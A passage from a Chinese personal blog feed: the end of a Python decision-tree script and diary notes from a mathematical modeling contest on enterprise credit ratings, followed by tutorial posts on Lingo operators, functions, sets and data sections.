class="line">candidate_feather_lst = [<span class="string">&#x27;17-19全部的净利润&#x27;</span>,<span class="string">&#x27;19年的进项交易的次数&#x27;</span>,<span class="string">&#x27;19年的销项交易的次数&#x27;</span>,<span class="string">&#x27;20年的未分配利润&#x27;</span>,<span class="string">&#x27;19年的未分配利润&#x27;</span>,<span class="string">&#x27;18年的未分配利润&#x27;</span>,<span class="string">&#x27;17年的未分配利润&#x27;</span>,<span class="string">&#x27;16年的未分配利润&#x27;</span>,<span class="string">&#x27;三年进项金额&#x27;</span>,<span class="string">&#x27;2017-2019总体税率情况&#x27;</span>,<span class="string">&#x27;2019作废票占比&#x27;</span>,<span class="string">&#x27;2019进项作废的支票&#x27;</span>,<span class="string">&#x27;2019销项作废的支票&#x27;</span>,<span class="string">&#x27;2019年进项负数发票占比&#x27;</span>,<span class="string">&#x27;2019年进项负数发票的数量&#x27;</span>]</span><br><span class="line"></span><br><span class="line">result_df = pd.DataFrame(&#123;<span class="string">&#x27;编号&#x27;</span>: range(<span class="number">1</span>, len(test_data) + <span class="number">1</span>), <span class="string">&#x27;企业代号&#x27;</span>: test_data[<span class="string">&#x27;企业代号&#x27;</span>]&#125;)</span><br><span class="line">result_df[<span class="string">&#x27;信誉评级&#x27;</span>] = <span class="literal">None</span></span><br><span class="line">n = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> [<span class="string">&#x27;信誉评级&#x27;</span>]:</span><br><span class="line">    n = n + <span class="number">1</span></span><br><span class="line">    x = data[candidate_feather_lst].values</span><br><span class="line">    y = data[key].tolist()</span><br><span class="line"></span><br><span class="line">    train_X, valid_X, train_y, valid_y = train_test_split(x, y, test_size=<span class="number">0.2</span>, random_state=<span class="number">0</span>)</span><br><span class="line">    test_X = test_data[candidate_feather_lst].values</span><br><span class="line"></span><br><span class="line">    clf = tree.DecisionTreeRegressor()</span><br><span class="line">    clf.fit(train_X, train_y)</span><br><span class="line"></span><br><span class="line">    predict_y = clf.predict(valid_X)</span><br><span class="line">    mse = round(mean_squared_error(predict_y, valid_y), <span class="number">4</span>)</span><br><span class="line">    <span class="comment"># 输出决策树</span></span><br><span class="line">    dot_data = tree.export_graphviz(clf,</span><br><span class="line">                                    feature_names=candidate_feather_lst,</span><br><span class="line">                                    out_file=<span class="literal">None</span>,</span><br><span class="line">                                    filled=<span class="literal">True</span>,</span><br><span class="line">                                    rounded=<span class="literal">True</span>)</span><br><span class="line">    dot_data = dot_data.replace(<span class="string">&#x27;fontname=helvetica&#x27;</span>, <span class="string">&#x27;fontname=&quot;Microsoft YaHei&quot;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    graph = pydotplus.graph_from_dot_data(dot_data)</span><br><span class="line">    graph.write_pdf(<span class="string">&#x27;..\\tree_%s.pdf&#x27;</span> % key)</span><br><span class="line"></span><br><span class="line">    plt.figure()</span><br><span class="line">    plt.rcParams[<span class="string">&#x27;font.sans-serif&#x27;</span>] = [<span class="string">&#x27;SimHei&#x27;</span>]</span><br><span class="line">    plt.rcParams[<span class="string">&#x27;axes.unicode_minus&#x27;</span>] = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    plt.scatter(valid_y, predict_y)</span><br><span class="line">    plt.plot([<span class="number">0</span>, max(valid_y)], [<span class="number">0</span>, max(valid_y)], color=<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    plt.title(<span class="string">&#x27;%s拟合结果评价&#x27;</span> % key)</span><br><span class="line">    plt.ylabel(<span class="string">&#x27;预测值&#x27;</span>)</span><br><span class="line">    plt.xlabel(<span class="string">&#x27;真实值&#x27;</span>)</span><br><span class="line">    plt.grid()</span><br><span class="line">    plt.show()</span><br><span class="line"></span><br><span class="line">    plt.scatter(range(len(valid_y)), valid_y - predict_y)</span><br><span class="line">    plt.title(<span class="string">&#x27;%s拟合结果偏差&#x27;</span> % key)</span><br><span class="line">    plt.ylabel(<span class="string">&#x27;偏差&#x27;</span>)</span><br><span class="line">    plt.xlabel(<span class="string">&#x27;样本序号&#x27;</span>)</span><br><span class="line">    plt.grid()</span><br><span class="line">    plt.show()</span><br><span class="line">    plt.savefig(<span class="string">&#x27;..\\03_%s.png&#x27;</span> % key)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> key == <span class="string">&#x27;信誉评级&#x27;</span>:  <span class="comment"># 预测信誉评级</span></span><br><span class="line">        result_df[<span class="string">&#x27;信誉评级&#x27;</span>] = clf.predict(test_X)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">result_df.to_excel(<span class="string">&#x27;..\\学习结果.xlsx&#x27;</span>, header=<span class="literal">True</span>, index=<span class="literal">False</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="9月13日"><a href="#9月13日" class="headerlink" title="9月13日"></a>9月13日</h4><p>下午写完了第三题，之后就是写分析，写摘要，改论文。6点多正式写完，大雅查重12.7%,论文是没什么重复，表格里的数据全重复了，代码的也重复了很多，python的for循环，pd的函数，都是些基础代码。这也想不到咋么去改，最后7点多降到11%交了，论文的重复率不高，那最后应该能过知网的查重。</p><p>第三题不同突发因素、不同行业，虽然用前两问的方法能继续做，但这样最后的论文肯定不太好。我们先将302家企业行业分类，用了个词云图。然后我们将突发因素分类信息安全、营运安全、资产安全方面，然后再细分小方面做层次分析，找文献得到各个行业的指标，用层次分析得到最后各个行业的突发因素评分，再加上第二题的因子继续做得到新排名，然后调整投资就行了。</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>感觉这次建模前期的状态比较散漫，后面才开始认真起来，但这样留下的时间不多，就会导致完成得比较紧迫，且没有充足的时间好好改论文。</p><p>对于发布论文题目当天晚上的时间要好好找资料，看论文。</p><p>在写论文前还是要好好分析，不然后面如果有更好的想法就很难有机会修改，分析透彻再开写。</p><p>打代码的时候变量名不能过于随意，不然容易查重。</p><p>要多了解各种模型，各种方法，不然比赛期间理解模型就会比较痛苦。</p><p>很多图表其实没有必要，你能想到的别人也能想到，用题目给的数据画个简单的统计图上去没有什么用。很多公式也没有必要，不用把一个结论性的公式反复推理，除非论文确实需要完整的过程。</p><p>下个阶段有两本书要看，一本是周志华的<a href="http://cs.nju.edu.cn/zhouzh/zhouzh.files/publication/MLbook2016.htm">《机器学习》</a>，另一本是<a href="https://book.douban.com/subject/24703171/">《机器学习实战》</a>。</p><p>感觉写的比较乱，也许在参加多次比赛后会好好整理一下。</p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Lingo函数</title>
      <link href="/2020/09/09/lingo%E7%AC%94%E8%AE%B0-lingo%E5%87%BD%E6%95%B0/"/>
      <url>/2020/09/09/lingo%E7%AC%94%E8%AE%B0-lingo%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<h4 id="1-基本运算符"><a href="#1-基本运算符" class="headerlink" title="1.基本运算符"></a>1.基本运算符</h4><h5 id="1-1算数运算符"><a href="#1-1算数运算符" class="headerlink" title="1.1算数运算符"></a>1.1算数运算符</h5><p>-(取反)  ^  *  /  +  -</p><h5 id="1-2-逻辑运算符"><a href="#1-2-逻辑运算符" class="headerlink" title="1.2.逻辑运算符"></a>1.2.逻辑运算符</h5><p>返回true或false</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">优先级排列</span><br><span class="line"><span class="meta">#not#  一元运算符,否定操作数的逻辑值</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#eq#   两个运算数相等返回ture 不等返回flase</span></span><br><span class="line"><span class="meta">#ne#   ≠</span></span><br><span class="line"><span class="meta">#gt#   &gt;</span></span><br><span class="line"><span class="meta">#ge#   ≥</span></span><br><span class="line"><span class="meta">#lt#   &lt;   </span></span><br><span class="line"><span class="meta">#le#   ≤</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#and#  都为true返回true</span></span><br><span class="line"><span class="meta">#or#   都为false返回false，其余情况返回true</span></span><br></pre></td></tr></table></figure><h5 id="1-3-关系运算符"><a href="#1-3-关系运算符" class="headerlink" title="1.3 关系运算符"></a>1.3 关系运算符</h5><p>Lingo有三种关系运算符：“=”、“&lt;=”和“&gt;=”。</p><p>Lingo中还能用“&lt;”表示小于等于关系，“&gt;”表示大于等于关系。但Lingo并不严格支持大于与小于关系，于是，为了A&lt;B成立，可以将其变为小于等于表达式$A+\xi\le B$,其中$\xi$为一个很小的正数，它的值依赖于模型中A小于B多少算不等。</p><h5 id="1-4-运算符优先级排列"><a href="#1-4-运算符优先级排列" class="headerlink" title="1.4 运算符优先级排列"></a>1.4 运算符优先级排列</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#not# -(取反)</span><br><span class="line">^</span><br><span class="line">* &#x2F;</span><br><span class="line">+ -</span><br><span class="line">#eq# #ne# #gt# #ge# #lt# #le#</span><br><span class="line">#and# #or#</span><br><span class="line">&lt;&#x3D; &#x3D; &gt;&#x3D;</span><br></pre></td></tr></table></figure><h4 id="2-数学函数"><a href="#2-数学函数" class="headerlink" title="2.数学函数"></a>2.数学函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">abs</span>(x) @<span class="built_in">sin</span>(x) @<span class="built_in">cos</span>(x) @<span class="built_in">tan</span>(x) mod(x,y) <span class="built_in">pow</span>(x,y) <span class="built_in">sqrt</span>(x)</span><br><span class="line">@<span class="built_in">exp</span>(x) <span class="comment">//返回常数e的x次方</span></span><br><span class="line">@<span class="built_in">log</span>(x) <span class="comment">//返回x的自然对数</span></span><br><span class="line">@lgm(x) <span class="comment">//返回x的gamma函数的自然对数</span></span><br><span class="line">@sign(x) <span class="comment">//如果 x&lt;0 返回-1；否则，返回 1</span></span><br><span class="line">@<span class="built_in">floor</span>(x) <span class="comment">//取整。当 x&gt;=0 时，返回不超过 x 的最大整数；当 x&lt;0时，返回不低于 x 的最大整数。</span></span><br><span class="line">@smax(x1,x2...xn) <span class="comment">//最大值</span></span><br><span class="line">@smin(x1,x2...xn) <span class="comment">//最小值</span></span><br></pre></td></tr></table></figure><h4 id="3-金融函数"><a href="#3-金融函数" class="headerlink" title="3.金融函数"></a>3.金融函数</h4><h5 id="3-1-fpa-I-n"><a href="#3-1-fpa-I-n" class="headerlink" title="3.1 @fpa(I,n)"></a>3.1 @fpa(I,n)</h5><p>返回一个净现值，其单位时间利率为I，连续支付n个时间段，该支付所对应的净现值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">贷款金额 <span class="number">50000</span> 元，贷款年利率 <span class="number">5.31</span>%，采取分期付款方式（每年年末还固定金额，直至还清）。问拟贷款 <span class="number">10</span> 年，每年需偿还多少元？</span><br><span class="line"></span><br><span class="line"><span class="number">50000</span> = x * @fpa(<span class="number">.0531</span>,<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">解得X=<span class="number">6573.069</span></span><br></pre></td></tr></table></figure><h5 id="3-2-fpl-I-n"><a href="#3-2-fpl-I-n" class="headerlink" title="3.2 @fpl(I,n)"></a>3.2 @fpl(I,n)</h5><p>返回一个净现值，单位时段利率为 I，第 n 个时段支付单位费用。</p><script type="math/tex; mode=display">两函数关系:\quad@fpa(I,n)=\sum_{k=1}^n@fpl(I,k)</script><h4 id="4-概率函数"><a href="#4-概率函数" class="headerlink" title="4.概率函数"></a>4.概率函数</h4><p>@pbn(p,n,x)  二项分布的累积分布函数。当 n 和（或）x 不是整数时，用线性插值法进行计算。</p><p>@pcx(n,x) </p><p>@peb(a,x)</p><p>……</p><h4 id="5-变量界定函数"><a href="#5-变量界定函数" class="headerlink" title="5.变量界定函数"></a>5.变量界定函数</h4><p>变量界定函数对变量的取值范围附加限制</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//通常情况下Lingo规定变量非负，可以通过@free和@bnd取消该设定</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@bin(x) 限制x为<span class="number">0</span>或<span class="number">1</span></span><br><span class="line">@bnd(L,x,U) 限制L≤x≤U</span><br><span class="line">@<span class="built_in">free</span>(x) 取消对变量x的默认下界为<span class="number">0</span>的限制，即x可以取任意实数</span><br><span class="line">@gin(x) 限制x为整数</span><br></pre></td></tr></table></figure><h4 id="6-集操作函数"><a href="#6-集操作函数" class="headerlink" title="6.集操作函数"></a>6.集操作函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>． </span><br><span class="line">   @in(set_name,primitive_index_1 [,primitive_index_2,„])   </span><br><span class="line">   如果元素位于指定集中，返回<span class="number">1</span>；否则返回<span class="number">0</span></span><br><span class="line">eg.    </span><br><span class="line">   I为全集，B为I的子集，C为B的补集</span><br><span class="line">   sets:</span><br><span class="line">      I/x1..x4/;</span><br><span class="line">      B(I)/x2/;</span><br><span class="line">      C(I)|<span class="meta">#not#@in(B,&amp;1):;</span></span><br><span class="line">   endsets</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span></span><br><span class="line">   @index([set_name,] primitive_set_element)    </span><br><span class="line">   返回在集中原始集成员的索引。如果 set_name被忽略，那么 Lingo 将返回与 所给参数匹配的第一个原始集成员的索引。</span><br><span class="line">   如果找不到，则报错。</span><br><span class="line">eg.</span><br><span class="line">   确定(B,Y)属于派生集S3</span><br><span class="line">   sets:</span><br><span class="line">      S1/A B C/;</span><br><span class="line">      S2/X Y Z/;</span><br><span class="line">      S3(S1,S2)/A X, A Z, B Y, C X/;</span><br><span class="line">   endsets</span><br><span class="line">   X=@in(S3,@index(S1,B),@index(S2,Y)); 返回<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="number">3.</span></span><br><span class="line">    @wrap(index,limit)</span><br><span class="line">    该函数返回j=index-k*limit。相当于index模limit，如果取模结果不等于<span class="number">0</span>，就返回该结果，否则返回limit。</span><br><span class="line">    参考: https:<span class="comment">//www.docin.com/p-1185198022.html  </span></span><br><span class="line">       </span><br><span class="line"><span class="number">4.</span>  </span><br><span class="line">    @size(set_name)  </span><br><span class="line">    返回集set_name中的成员个数</span><br><span class="line">       </span><br></pre></td></tr></table></figure><h4 id="7-集循环函数"><a href="#7-集循环函数" class="headerlink" title="7.集循环函数"></a>7.集循环函数</h4><h5 id="7-1-基本语法"><a href="#7-1-基本语法" class="headerlink" title="7.1 基本语法"></a>7.1 基本语法</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">@function(setname[(set_index_list)[|conditional_qualifier]]:expression_list);</span><br><span class="line">其中function为以下四个函数</span><br><span class="line"></span><br><span class="line">1.@for</span><br><span class="line">  model:</span><br><span class="line">  sets:</span><br><span class="line">    number&#x2F;1..5&#x2F;:x;</span><br><span class="line">  endsets</span><br><span class="line">    @for(number(I): x(I)&#x3D;I^2);</span><br><span class="line">  end</span><br><span class="line">  </span><br><span class="line">2.@sum</span><br><span class="line">  model:</span><br><span class="line">  data:</span><br><span class="line">    N&#x3D;6;</span><br><span class="line">  enddata</span><br><span class="line">  sets:</span><br><span class="line">    number&#x2F;1..N&#x2F;:x;</span><br><span class="line">  endsets</span><br><span class="line">  data:</span><br><span class="line">    x &#x3D; 5 1 3 4 6 10;</span><br><span class="line">  enddata</span><br><span class="line">    s&#x3D;@sum(number(I) | I #le# 5: x);</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">3.@min和@max 返回指定的集成员的一个表达式的最小值或最大值</span><br><span class="line">  model:</span><br><span class="line">  data:</span><br><span class="line">    N&#x3D;6;</span><br><span class="line">  enddata</span><br><span class="line">  sets:</span><br><span class="line">    number&#x2F;1..N&#x2F;:x;</span><br><span class="line">  endsets</span><br><span class="line">  data:</span><br><span class="line">    x &#x3D; 5 1 3 4 6 10;</span><br><span class="line">  enddata</span><br><span class="line">    minv&#x3D;@min(number(I) | I #le# 5: x);</span><br><span class="line">    maxv&#x3D;@max(number(I) | I #ge# N-2: x);</span><br><span class="line">  end</span><br></pre></td></tr></table></figure><h4 id="8-输入和输出函数"><a href="#8-输入和输出函数" class="headerlink" title="8.输入和输出函数"></a>8.输入和输出函数</h4><p>@flie 从外部文件中输入数据  </p><p>@text  输出操作</p><p>@ole 是从 EXCEL 中引入或输出数据的接口函数</p><p>@ranged(variable_or_row_name)</p><p>@rangeu(variable_or_row_name)</p><p>@status()</p><p>@dual</p><h4 id="9-辅助函数"><a href="#9-辅助函数" class="headerlink" title="9.辅助函数"></a>9.辅助函数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">1.</span><br><span class="line">  @if(logical_condition,true_result,false_result)</span><br><span class="line">  如果逻辑表达式为true，则返回true_result,否则返回false_result</span><br><span class="line">eg.</span><br><span class="line">  model:</span><br><span class="line">    min&#x3D;fx+fy;</span><br><span class="line">    fx&#x3D;@if(x #gt# 0, 100,0)+2*x;</span><br><span class="line">    fy&#x3D;@if(y #gt# 0,60,0)+3*y;</span><br><span class="line">    x+y&gt;&#x3D;30;</span><br><span class="line">  end</span><br><span class="line">  </span><br><span class="line">2.</span><br><span class="line">  @warn(’text’,logical_condition)</span><br><span class="line">  如果逻辑表达式为true，则产生内容为text的消息框</span><br><span class="line">eg.</span><br><span class="line">  model:</span><br><span class="line">    x&#x3D;1;</span><br><span class="line">    @warn(&#39;x 是正数&#39;,x #gt# 0); </span><br><span class="line">  end</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Lingo </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Lingo笔记(集部分、数据部分与初始部分)</title>
      <link href="/2020/09/08/lingo%E7%AC%94%E8%AE%B0-%E9%9B%86%E3%80%81%E6%95%B0%E6%8D%AE%E3%80%81%E5%88%9D%E5%A7%8B%E9%83%A8%E5%88%86/"/>
      <url>/2020/09/08/lingo%E7%AC%94%E8%AE%B0-%E9%9B%86%E3%80%81%E6%95%B0%E6%8D%AE%E3%80%81%E5%88%9D%E5%A7%8B%E9%83%A8%E5%88%86/</url>
      
        <content type="html"><![CDATA[<h4 id="1-集部分"><a href="#1-集部分" class="headerlink" title="1.集部分"></a>1.集部分</h4><h5 id="1-1-集的概念"><a href="#1-1-集的概念" class="headerlink" title="1.1 集的概念"></a>1.1 集的概念</h5><p><strong>集</strong>：由相联系的对象聚合而成，近似与其它语言中类的概念。Lingo包括两种类型的集：原始集(primitive set)和派生集(derived set)。</p><p><strong>对象</strong>：集的成员。</p><p><strong>属性</strong>：每个集成员之间一个或多个与之关联的特征。</p><p>原始集:由一些最基本的对象组成的。</p><p>派生集:用一个或多个其它集来定义的，也就是说，它的成员来自于其它已存在的集。</p><h5 id="1-2-原始集的定义"><a href="#1-2-原始集的定义" class="headerlink" title="1.2 原始集的定义"></a>1.2 原始集的定义</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义原始集</span></span><br><span class="line">setname[/member_list/][:attribute_list]; <span class="comment">//[]表示内容可选</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//例子: </span></span><br><span class="line"><span class="comment">//使用集前需有集定义，一关键词“sets:”开始，“endsets”结束</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//1.显式罗列</span></span><br><span class="line">sets:</span><br><span class="line">students/John Jill, Rose Mike/: sex, age;</span><br><span class="line">endsets</span><br><span class="line">    </span><br><span class="line"><span class="comment">//2.隐式罗列 </span></span><br><span class="line">     <span class="comment">//格式</span></span><br><span class="line">     setname/member1..memberN/[: attribute_list];</span><br><span class="line">     <span class="comment">//例子</span></span><br><span class="line">     <span class="number">1.</span>Oct...JAN 生成各月</span><br><span class="line">     <span class="number">2.1</span>..<span class="number">.5</span> 生成<span class="number">1</span>到<span class="number">5</span></span><br><span class="line">     <span class="number">3.</span>car1...car10</span><br></pre></td></tr></table></figure><h5 id="1-3-派生集的定义"><a href="#1-3-派生集的定义" class="headerlink" title="1.3 派生集的定义"></a>1.3 派生集的定义</h5><p><strong>稠密集</strong>：成员由父集成员所有的组合构成的派生集。为父集的笛卡尔积。</p><p><strong>稀疏集</strong>：为父集成员所有组合构成的集合的一个子集的派生集。为父集笛卡尔积的子集，即稠密集的子集。可以通过<strong>显式罗列</strong>或者<strong>设置成员资格过滤器</strong>来生成。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义派生集</span></span><br><span class="line">setname(parent_set_list)[/member_list/][:attribute_list];</span><br><span class="line"></span><br><span class="line"><span class="comment">//例子:稠密集的生成</span></span><br><span class="line">sets:</span><br><span class="line">product/A B/;</span><br><span class="line">  machine/M N/;</span><br><span class="line">  week/<span class="number">1.</span><span class="number">.2</span>/;</span><br><span class="line">  allowed(product,machine,week):x; <span class="comment">//将会生成了三个父集的所有组合共八组作为 allowed 集的成员</span></span><br><span class="line">endsets   </span><br><span class="line">    </span><br><span class="line"><span class="comment">//稀疏集的生成 显式罗列   当集合元素过多时难以操作</span></span><br><span class="line">  allowed(product,machine,week)/A M <span class="number">1</span>,A N <span class="number">2</span>,B N <span class="number">1</span>/;</span><br><span class="line"></span><br><span class="line"><span class="comment">//稀疏集的生成 过滤器 竖线(|)为过滤器的判断开始  #eq#，#and#为逻辑运算符</span></span><br><span class="line"></span><br><span class="line">sets: </span><br><span class="line">  <span class="comment">//学生集：性别属性 sex，1 表示男性，0 表示女性；年龄属性 age. ;</span></span><br><span class="line">  students/John,Jill,Rose,Mike/:sex,age;</span><br><span class="line">  <span class="comment">//男学生和女学生的联系集：友好程度属性 friend，[0，1]之间的数。 ;</span></span><br><span class="line">  linkmf(students,students)|sex(&amp;<span class="number">1</span>) <span class="meta">#eq# 1 #and# sex(&amp;2) #eq# 0: friend;</span></span><br><span class="line">  <span class="comment">//男学生和女学生的友好程度大于 0.5 的集;</span></span><br><span class="line">  linkmf2(linkmf) | <span class="keyword">friend</span>(&amp;<span class="number">1</span>,&amp;<span class="number">2</span>) <span class="meta">#ge# 0.5 : x;</span></span><br><span class="line">endsets</span><br><span class="line">data: sex,age = <span class="number">1</span> <span class="number">16</span></span><br><span class="line">                <span class="number">0</span> <span class="number">14</span></span><br><span class="line">                <span class="number">0</span> <span class="number">17</span></span><br><span class="line">                <span class="number">0</span> <span class="number">13</span>;</span><br><span class="line"><span class="keyword">friend</span> = <span class="number">0.3</span> <span class="number">0.5</span> <span class="number">0.6</span>;</span><br><span class="line">enddata</span><br></pre></td></tr></table></figure><h5 id="1-4-集与c中结构体的对比"><a href="#1-4-集与c中结构体的对比" class="headerlink" title="1.4 集与c中结构体的对比"></a>1.4 集与c中结构体的对比</h5><div class="table-container"><table><thead><tr><th>集</th><th>结构体</th></tr></thead><tbody><tr><td>setname</td><td>结构体标签</td></tr><tr><td>member_list</td><td>结构体实例</td></tr><tr><td>attribute_list</td><td>结构体中变量定义</td></tr></tbody></table></div><h5 id="1-5-关于集的关系图"><a href="#1-5-关于集的关系图" class="headerlink" title="1.5 关于集的关系图"></a>1.5 关于集的关系图</h5><p><img src="/2020/09/08/lingo%E7%AC%94%E8%AE%B0-%E9%9B%86%E3%80%81%E6%95%B0%E6%8D%AE%E3%80%81%E5%88%9D%E5%A7%8B%E9%83%A8%E5%88%86/集.png" alt></p><h4 id="2-数据部分"><a href="#2-数据部分" class="headerlink" title="2.数据部分"></a>2.数据部分</h4><h5 id="2-1-基本语法："><a href="#2-1-基本语法：" class="headerlink" title="2.1 基本语法："></a>2.1 基本语法：</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">object_list = value_list;  </span><br></pre></td></tr></table></figure><p>对象列(object_list):包含要指定值的属性名、要设置集成员的集名，用逗号或空格隔开。一个对象列中至多有一个集名，而属性名可以有任意多。如果对象列中有多个属性名，那么它们的类型必须一致。如果对象列中有一个集名，那么对象列中所有的属性的类型就是这个集。</p><p>数值列(value_list):给定对应对象列对象的值，用逗号或空格分隔，属性值必须等于集成员个数。</p><h5 id="2-2-数据说明"><a href="#2-2-数据说明" class="headerlink" title="2.2 数据说明"></a>2.2 数据说明</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">sets:</span><br><span class="line">  set1/A,B,C/: X,Y;</span><br><span class="line">endsets</span><br><span class="line">data:</span><br><span class="line">  X=<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>;</span><br><span class="line">  Y=<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>;</span><br><span class="line">enddata</span><br><span class="line">    </span><br><span class="line"><span class="comment">//复合数据声明，作用效果同上</span></span><br><span class="line">sets:</span><br><span class="line">  set1/A,B,C/: X,Y;</span><br><span class="line">endsets</span><br><span class="line">data:</span><br><span class="line">  X,Y=<span class="number">1</span> <span class="number">4</span></span><br><span class="line">      <span class="number">2</span> <span class="number">5</span></span><br><span class="line">      <span class="number">3</span> <span class="number">6</span>;</span><br><span class="line">enddata</span><br></pre></td></tr></table></figure><h5 id="2-3-数据部分值的设定"><a href="#2-3-数据部分值的设定" class="headerlink" title="2.3 数据部分值的设定"></a>2.3 数据部分值的设定</h5><p>参数:即一个在数据部分确定的标量变量。</p><p>实时数据处理:有些数据在模型中值未定，需要在运行时输入，用 ? 